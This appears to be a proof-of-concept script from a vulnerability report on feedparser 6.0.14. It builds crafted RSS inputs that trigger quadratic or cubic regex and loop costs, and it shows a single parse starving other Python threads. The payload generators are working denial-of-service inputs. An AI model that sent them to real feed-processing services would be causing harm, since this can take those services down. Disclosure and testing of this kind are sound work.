"""R05: super-linear CPU in feedparser 6.0.14 on small hostile feeds.

Each case is timed at size n and 2n to show the growth rate:

  pi-encoding  encodings.py:68  RE_XML_PI_ENCODING on a long first line   ~cubic
  author-email mixin.py:746     e-mail regex in _sync_author_detail       quadratic
  css-url      sanitizer.py:837 url(...) stripper in sanitize_style       quadratic
  comment      sanitizer.py:873 '--[^>]*>' fallback for unclosed comments quadratic
  ns-loop      parsers/strict.py:89  per-element scan of namespaces_in_use quadratic

All of these run whether or not the build reads the affected field (author,
style attributes, ...), because parse() processes the whole document.

Finally it shows that while one such parse runs, a second Python thread makes
almost no progress: `re` does not release the GIL, so one feed stalls the whole
ThreadPoolExecutor and a socket timeout cannot interrupt it.

Run:  python -I r05_cpu_dos.py     (stdlib + feedparser, no network; ~1 min)
"""
import io
import threading
import time

import feedparser


def rss(inner):
    return ("<?xml version='1.0'?><rss version='2.0'><channel><title>t</title>"
            "<item><title>x</title>" + inner + "</item></channel></rss>").encode()


CASES = {
    "pi-encoding": (500, lambda n: b"<?xml " + b"encoding='a' " * n + b"\n<rss/>"),
    "author-email": (8000, lambda n: rss("<author>" + "a." * n + "</author>")),
    "css-url": (4000, lambda n: rss('<description>&lt;p style="' + "url(" * n + '"&gt;x&lt;/p&gt;</description>')),
    "comment": (40000, lambda n: rss("<description>&amp;&lt;!--" + "-" * n + "</description>")),
    "ns-loop": (4000, lambda n: (
        "<?xml version='1.0'?><rss version='2.0' "
        + " ".join(f"xmlns:p{i}='urn:x{i}'" for i in range(n))
        + " xmlns:z='urn:z'><channel><item><title>x</title>" + "<z:a/>" * n
        + "</item></channel></rss>").encode()),
}


def timed(data):
    t = time.perf_counter()
    feedparser.parse(io.BytesIO(data), response_headers={"content-type": "application/rss+xml"})
    return time.perf_counter() - t


for name, (n, make) in CASES.items():
    a, b = make(n), make(2 * n)
    ta, tb = timed(a), timed(b)
    print(f"{name:13} {len(a)/1e3:7.1f} KB {ta:6.2f}s | {len(b)/1e3:7.1f} KB {tb:6.2f}s | x{tb/ta:4.1f} per doubling")

# GIL starvation: count loop iterations in another thread during one slow parse
counter = 0
stop = False


def spin():
    global counter
    while not stop:
        counter += 1


th = threading.Thread(target=spin)
th.start()
time.sleep(0.5)
c0 = counter
time.sleep(1.0)
idle_rate = counter - c0
c0, t0 = counter, time.perf_counter()
timed(CASES["pi-encoding"][1](1000))
busy_rate = (counter - c0) / (time.perf_counter() - t0)
stop = True
th.join()
print(f"other thread: {idle_rate:,.0f} iterations/s normally, {busy_rate:,.0f} iterations/s during the slow parse")
